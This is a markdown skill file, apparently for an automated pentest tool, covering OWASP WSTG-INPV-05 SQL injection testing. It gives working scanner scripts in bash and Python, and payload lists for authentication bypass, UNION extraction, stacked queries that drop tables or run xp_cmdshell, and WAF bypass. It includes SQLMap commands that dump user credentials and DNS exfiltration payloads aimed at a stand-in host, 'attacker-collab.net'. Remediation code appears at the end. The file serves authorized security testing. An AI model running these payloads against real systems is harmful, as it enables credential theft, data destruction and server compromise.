---
name: wstg-inpv-05
description: "Testing for SQL Injection"
category: input-validation
owasp_id: WSTG-INPV-05
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: [mysql, postgresql, mssql, oracle, sqlite, php, java, python, nodejs]
cwe_ids: [CWE-89, CWE-564]
chains_with: [wstg-authz-02, wstg-conf-05, wstg-inpv-06]
prerequisites: [wstg-info-01, wstg-info-06]
severity_boost:
  wstg-authz-02: "SQLi + IDOR = Account Takeover (Critical)"
  wstg-conf-05: "SQLi + Directory Listing = Full DB Dump (Critical)"
---

# wstg-inpv-05

## Test ID

WSTG-INPV-05

## Test Name

Testing for SQL Injection

## High-Level Description

SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. SQL injection can result in data theft, data loss, denial of service, or complete system compromise.

---

## What to Check

- [ ] User input in SQL queries
- [ ] Error-based injection
- [ ] Union-based injection
- [ ] Blind injection (Boolean/Time)
- [ ] Second-order injection
- [ ] Stored procedures

---

## How to Test

### Step 1: Identify Injection Points

```bash
#!/bin/bash
TARGET="https://target.com"

# Common injection points
ENDPOINTS=(
    "/search?q=test"
    "/product?id=1"
    "/user?name=admin"
    "/login"
    "/api/users?filter=active"
)

# Basic SQLi detection payloads
PAYLOADS=(
    "'"
    "''"
    "\`"
    "\")"
    "'"
    "1' OR '1'='1"
    "1 OR 1=1"
    "1' OR '1'='1'--"
    "1' OR '1'='1'/*"
    "1' AND '1'='2"
    "1' WAITFOR DELAY '0:0:5'--"
    "1'; SELECT SLEEP(5);--"
)

for endpoint in "${ENDPOINTS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        response=$(curl -s "$TARGET$endpoint$payload" 2>&1)

        # Check for SQL error messages
        if echo "$response" | grep -qiE "sql|mysql|oracle|syntax|query|ORA-|SQL Server"; then
            echo "[VULN] Potential SQLi at: $endpoint with: $payload"
        fi
    done
done
```

### Step 2: SQL Injection Tester

```python
#!/usr/bin/env python3
"""
SQL Injection Vulnerability Tester
"""

import requests
import time
import re
from urllib.parse import urljoin, quote

class SQLInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()
        self.timeout = 30

    # SQL Error patterns by database
    ERROR_PATTERNS = {
        'MySQL': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
        ],
        'PostgreSQL': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
        ],
        'MSSQL': [
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            r"Unclosed quotation mark after the character string",
        ],
        'Oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
        ],
        'SQLite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
        ],
    }

    # Basic injection payloads
    BASIC_PAYLOADS = [
        "'",
        "''",
        '"',
        '`',
        "')",
        "'))",
        "\")",
        "`))",
        "'--",
        "'/*",
        "1'",
        "1\"",
    ]

    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' OR '1'='1", "' OR '1'='2"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("1' OR '1'='1'--", "1' OR '1'='2'--"),
        ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ]

    # Time-based payloads
    TIME_PAYLOADS = {
        'MySQL': "' OR SLEEP(5)--",
        'PostgreSQL': "'; SELECT pg_sleep(5);--",
        'MSSQL': "'; WAITFOR DELAY '0:0:5';--",
        'Oracle': "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a",
        'SQLite': "' OR (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)--",
    }

    # UNION-based payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    ]

    def test_error_based(self, param, method='GET'):
        """Test for error-based SQL injection"""
        print(f"\n[*] Testing error-based SQLi on: {param}")

        for payload in self.BASIC_PAYLOADS:
            try:
                if method == 'GET':
                    response = self.session.get(self.url, params={param: payload}, timeout=self.timeout)
                else:
                    response = self.session.post(self.url, data={param: payload}, timeout=self.timeout)

                # Check for database errors
                for db, patterns in self.ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            print(f"[VULN] Error-based SQLi detected! (Database: {db})")
                            print(f"  Payload: {payload}")
                            self.findings.append({
                                'type': 'Error-based SQLi',
                                'parameter': param,
                                'payload': payload,
                                'database': db,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def test_boolean_based(self, param, method='GET'):
        """Test for boolean-based blind SQL injection"""
        print(f"\n[*] Testing boolean-based blind SQLi on: {param}")

        # Get baseline response
        if method == 'GET':
            baseline = self.session.get(self.url, params={param: 'test'}, timeout=self.timeout)
        else:
            baseline = self.session.post(self.url, data={param: 'test'}, timeout=self.timeout)

        baseline_len = len(baseline.text)

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                if method == 'GET':
                    true_response = self.session.get(self.url, params={param: true_payload}, timeout=self.timeout)
                    false_response = self.session.get(self.url, params={param: false_payload}, timeout=self.timeout)
                else:
                    true_response = self.session.post(self.url, data={param: true_payload}, timeout=self.timeout)
                    false_response = self.session.post(self.url, data={param: false_payload}, timeout=self.timeout)

                true_len = len(true_response.text)
                false_len = len(false_response.text)

                # Check for significant difference
                if abs(true_len - false_len) > 50:
                    print(f"[VULN] Boolean-based blind SQLi detected!")
                    print(f"  True payload ({true_len} bytes): {true_payload}")
                    print(f"  False payload ({false_len} bytes): {false_payload}")
                    self.findings.append({
                        'type': 'Boolean-based Blind SQLi',
                        'parameter': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param, method='GET'):
        """Test for time-based blind SQL injection"""
        print(f"\n[*] Testing time-based blind SQLi on: {param}")

        # Get baseline response time
        start = time.time()
        if method == 'GET':
            self.session.get(self.url, params={param: 'test'}, timeout=self.timeout)
        else:
            self.session.post(self.url, data={param: 'test'}, timeout=self.timeout)
        baseline_time = time.time() - start

        for db, payload in self.TIME_PAYLOADS.items():
            try:
                start = time.time()
                if method == 'GET':
                    self.session.get(self.url, params={param: payload}, timeout=self.timeout)
                else:
                    self.session.post(self.url, data={param: payload}, timeout=self.timeout)
                response_time = time.time() - start

                # Check if response took significantly longer (5+ seconds)
                if response_time > baseline_time + 4:
                    print(f"[VULN] Time-based blind SQLi detected! (Database: {db})")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
                    self.findings.append({
                        'type': 'Time-based Blind SQLi',
                        'parameter': param,
                        'payload': payload,
                        'database': db,
                        'response_time': response_time,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based blind SQLi - Request timed out! (Database: {db})")
                self.findings.append({
                    'type': 'Time-based Blind SQLi',
                    'parameter': param,
                    'payload': payload,
                    'database': db,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def test_union_based(self, param, method='GET'):
        """Test for UNION-based SQL injection"""
        print(f"\n[*] Testing UNION-based SQLi on: {param}")

        for payload in self.UNION_PAYLOADS:
            try:
                if method == 'GET':
                    response = self.session.get(self.url, params={param: payload}, timeout=self.timeout)
                else:
                    response = self.session.post(self.url, data={param: payload}, timeout=self.timeout)

                # Check for successful UNION injection indicators
                if 'NULL' not in response.text:
                    # The UNION might have worked if no error and different response
                    pass

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SQL INJECTION VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SQL injection vulnerabilities confirmed.")
            print("Note: Manual testing may still reveal vulnerabilities.")
        else:
            print(f"\nFound {len(self.findings)} vulnerabilities:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['type']}")
                print(f"  Parameter: {f['parameter']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")
                if 'database' in f:
                    print(f"  Database: {f['database']}")
                print()

    def run_tests(self, params=None, method='GET'):
        """Run all SQL injection tests"""
        if params is None:
            params = ['id', 'q', 'search', 'user', 'name', 'page', 'category']

        for param in params:
            self.test_error_based(param, method)
            self.test_boolean_based(param, method)
            self.test_time_based(param, method)
            self.test_union_based(param, method)

        self.generate_report()

# Usage
tester = SQLInjectionTester("https://target.com/product")
tester.run_tests(params=['id'])
```

### Step 3: Manual Testing Payloads

```sql
-- Error-based Detection
'
''
`
")
')
'))
`))

-- Authentication Bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'#
admin'/*
' OR 1=1--
" OR 1=1--
' OR 'x'='x
') OR ('1'='1

-- UNION-based (find column count)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data (MySQL)
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT user(),database(),NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- Time-based Blind (MySQL)
' OR SLEEP(5)--
' AND SLEEP(5)--
1' AND SLEEP(5)#

-- Time-based Blind (MSSQL)
'; WAITFOR DELAY '0:0:5'--
1'; WAITFOR DELAY '0:0:5'--

-- Time-based Blind (PostgreSQL)
'; SELECT pg_sleep(5);--

-- Stacked Queries
'; INSERT INTO users VALUES('hacker','pass')--
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--
```

### Step 4: Advanced Techniques

```python
# WAF Bypass Techniques

WAF_BYPASS_PAYLOADS = [
    # Case manipulation
    "' UnIoN SeLeCt NULL--",

    # Inline comments
    "' UN/**/ION SEL/**/ECT NULL--",
    "/*!50000UNION*/ /*!50000SELECT*/ NULL--",

    # URL encoding
    "%27%20OR%20%271%27%3D%271",
    "%2527%2520OR%2520%25271%2527%253D%25271",  # Double encoding

    # Unicode encoding
    "' %u0055NION %u0053ELECT NULL--",

    # Null bytes
    "%00' OR '1'='1",

    # Scientific notation
    "1e0' OR '1'='1",

    # Hex encoding
    "' OR 0x31=0x31--",

    # String concatenation (MySQL)
    "' OR 'a'='a' OR 'a'='a",

    # Tab/newline instead of space
    "'\tOR\t'1'='1",
    "'\nOR\n'1'='1",
]

# Second-Order SQLi
# Payload stored first, executed later
# Example: Register username as: admin'--
# Later when username is used in another query, injection occurs
```

---

## Tools

| Tool           | Purpose                  |
| -------------- | ------------------------ |
| SQLMap         | Automated SQL injection  |
| Burp Suite     | Manual testing           |
| Havij          | SQL injection automation |
| jSQL Injection | GUI-based SQLi tool      |
| NoSQLMap       | NoSQL injection          |

---

## Example Commands/Payloads

### Detection (curl, DBMS-agnostic)

```bash
TARGET="https://target.com/product"

# Error-based probing - single quote vs. double quote vs. balanced quote
for p in "'" "''" '"' "%27" "1'" "1\""; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?id=$p")
    echo "payload=$p -> $code"
done

# Boolean-based blind - compare TRUE vs FALSE response length
LEN_TRUE=$(curl -s "$TARGET?id=1 AND 1=1" | wc -c)
LEN_FALSE=$(curl -s "$TARGET?id=1 AND 1=2" | wc -c)
echo "TRUE=$LEN_TRUE FALSE=$LEN_FALSE"
[ "$LEN_TRUE" != "$LEN_FALSE" ] && echo "[VULN] Boolean-based blind SQLi likely"

# Time-based blind - baseline vs delayed response
time curl -s "$TARGET?id=1" -o /dev/null
time curl -s "$TARGET?id=1' AND SLEEP(5)-- -" -o /dev/null
```

### SQLMap (automated, all techniques)

```bash
# Full automated scan against a GET parameter
sqlmap -u "https://target.com/product?id=1" --batch --level=3 --risk=2

# Test a POST form / raw request from Burp
sqlmap -r request.txt --batch --dbs

# Force specific technique(s): B=boolean, E=error, U=union, S=stacked, T=time, Q=inline
sqlmap -u "https://target.com/product?id=1" --technique=BEUSTQ

# Crawl and test an entire app
sqlmap -u "https://target.com" --crawl=2 --batch --forms

# Enumerate databases -> tables -> columns -> dump
sqlmap -u "https://target.com/product?id=1" --dbs
sqlmap -u "https://target.com/product?id=1" -D webapp --tables
sqlmap -u "https://target.com/product?id=1" -D webapp -T users --columns
sqlmap -u "https://target.com/product?id=1" -D webapp -T users -C username,password --dump
```

### DBMS Fingerprinting (keyword-based, single request)

Instead of relying on error text, these tautologies only evaluate `TRUE` on their specific DBMS — useful when errors are suppressed:

| DBMS       | Fingerprint payload                               |
| ---------- | -------------------------------------------------- |
| MySQL      | `conv('a',16,2)=conv('a',16,2)`                   |
| MySQL      | `connection_id()=connection_id()`                 |
| MSSQL      | `@@CONNECTIONS>0` / `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| Oracle     | `ROWNUM=ROWNUM` / `RAWTOHEX('AB')=RAWTOHEX('AB')` |
| PostgreSQL | `5::int=5` / `current_database()=current_database()` |
| SQLite     | `sqlite_version()=sqlite_version()`               |
| MS Access  | `val(cvar(1))=1`                                  |

```bash
for p in "conv('a',16,2)=conv('a',16,2)" "5::int=5" "ROWNUM=ROWNUM" "sqlite_version()=sqlite_version()"; do
  curl -s "$TARGET?id=1 AND $p" -o /tmp/r1
  curl -s "$TARGET?id=1 AND 1=2" -o /tmp/r2
  diff -q /tmp/r1 /tmp/r2 >/dev/null || echo "[+] DBMS keyword matched: $p"
done
```

### Out-of-Band (OOB) Exfiltration via DNS

Use when the response gives no visible feedback (blind, no timing oracle available) — exfiltrate data through a DNS lookup to a Burp Collaborator / attacker-controlled domain:

```sql
-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker-collab.net\\a'))-- -

-- MSSQL (requires VIEW SERVER STATE / CONTROL SERVER)
'; exec master..xp_dirtree '\\'+(SELECT @@version)+'.attacker-collab.net\a'--

-- Oracle (XXE-style via XMLType)
' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [ <!ENTITY % rmt SYSTEM "http://'||(SELECT user FROM DUAL)||'.attacker-collab.net/"> %rmt;]>'),'/l') FROM DUAL) IS NOT NULL--

-- PostgreSQL (requires superuser / pg_execute_server_program)
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker-collab.net'--
```

### Second-Order Injection (store-then-trigger)

```text
1. Register/update a field with a payload that is syntactically inert on INSERT:
     username = admin'--
2. The value is stored as-is (parameterized INSERT, so no injection fires here).
3. A DIFFERENT feature later concatenates that stored value into a new query
   (e.g. an admin panel "view activity for user X" lookup):
     SELECT * FROM logs WHERE username = 'admin'--'
4. The trailing content is commented out -> effectively `WHERE username = 'admin'`,
   bypassing whatever the second query intended to filter on.
```

### Generic WAF Bypass Cheats

| Blocked | Bypass | Note |
| ------- | ------ | ---- |
| Space | `/**/`, `%09` (tab), `%0A` (LF), `(1)and(1)=(1)--` | Alternative whitespace/parenthesis grouping |
| `,` (comma) | `LIMIT 1 OFFSET 0` instead of `LIMIT 0,1`; `SUBSTR('SQL' FROM 1 FOR 1)` instead of `SUBSTR('SQL',1,1)` | Avoids comma-based WAF signatures |
| `=` (equals) | `SUBSTRING(VERSION(),1,1)LIKE(5)`, `... IN(4,3)`, `... BETWEEN 3 AND 4` | Operator-equivalent bypass |
| `AND`/`OR` keywords | `&&` / `\|\|` | Symbolic equivalents |
| Case-based filters | `UnIoN SeLeCt`, `/*!50000UNION*/ /*!50000SELECT*/` (MySQL conditional comment) | Case randomization / version-gated comments |

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| Response contains `SQL syntax`, `mysql_fetch`, `ORA-`, `Unclosed quotation mark`, `PostgreSQL query failed`, `SQLite3::` | Error-based SQLi confirmed (DBMS fingerprint from message) |
| Content length/hash differs between `AND 1=1` and `AND 1=2` with identical HTTP status | Boolean-based blind SQLi |
| Response consistently delayed by ~N seconds only when a `SLEEP(N)`/`WAITFOR DELAY`/`pg_sleep(N)` payload is sent | Time-based blind SQLi |
| Extra columns from `UNION SELECT` appear in the rendered page (reflected value under attacker control) | UNION-based SQLi, column count and injectable position confirmed |
| DNS lookup for the injected subdomain arrives at the collaborator server | Out-of-band SQLi confirmed, works even when the HTTP response carries no observable signal |

---

## Remediation

```python
# Python - Use parameterized queries
import sqlite3

# VULNERABLE
def get_user_vulnerable(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)  # SQL Injection!

# SECURE - Parameterized query
def get_user_secure(username):
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))

# SECURE - Using ORM (SQLAlchemy)
from sqlalchemy.orm import Session

def get_user_orm(session: Session, username: str):
    return session.query(User).filter(User.username == username).first()
```

```java
// Java - PreparedStatement
// VULNERABLE
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SECURE
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();
```

```php
<?php
// PHP - PDO with prepared statements
// VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = $pdo->query($query);

// SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();
?>
```

---

## Risk Assessment

| Finding                         | CVSS | Severity |
| ------------------------------- | ---- | -------- |
| SQL Injection (unauthenticated) | 9.8  | Critical |
| SQL Injection (authenticated)   | 8.8  | High     |
| Blind SQL Injection             | 8.6  | High     |
| Second-order SQL Injection      | 8.6  | High     |

---

## CWE Categories

| CWE ID     | Title                                                              |
| ---------- | ------------------------------------------------------------------ |
| **CWE-89** | Improper Neutralization of Special Elements used in an SQL Command |

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)


---

## Checklist

```
[ ] Error-based injection tested
[ ] Boolean-based blind tested
[ ] Time-based blind tested
[ ] UNION-based injection tested
[ ] Second-order injection considered
[ ] WAF bypass techniques tested
[ ] All input parameters tested
[ ] Findings documented
```
